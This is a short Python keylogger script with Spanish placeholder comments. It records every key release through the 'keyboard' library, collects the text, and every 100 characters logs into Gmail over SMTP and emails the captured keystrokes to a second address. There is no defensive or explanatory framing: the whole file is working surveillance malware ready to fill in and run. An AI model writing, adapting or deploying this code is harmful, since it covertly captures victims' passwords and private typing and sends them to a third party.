import keyboard as key 

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

import datetime

Text = ""

while True:
    Recorded = str(key.read_event())
    
    if Recorded.__contains__('up'):
        Recorded = Recorded.replace('KeyboardEvent(', '')
        Recorded = Recorded.replace(' up)', '')

        if (len(Recorded)>1):
            Text = Text + " " + Recorded + " "
        else:
            Text = Text + Recorded

    if (len(Text)>=100): 
        try:
            msg = MIMEMultipart()

            password="contraseña del email de donde se enviara lo que se escribe(pass correo 1)"
            msg['From']="correo del que se envia(correo 1)"
            msg['To']="correo al que se envia (correo 2)"
            msg['Subject']="Report "+ str(datetime.datetime.now().date())

            msg.attach(MIMEText(Text, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()

            server.login(msg['From'], password)

            server.sendmail(msg['From'], msg['To'], msg.as_string())

            server.quit()

            Text=""


        except:
            print("Error")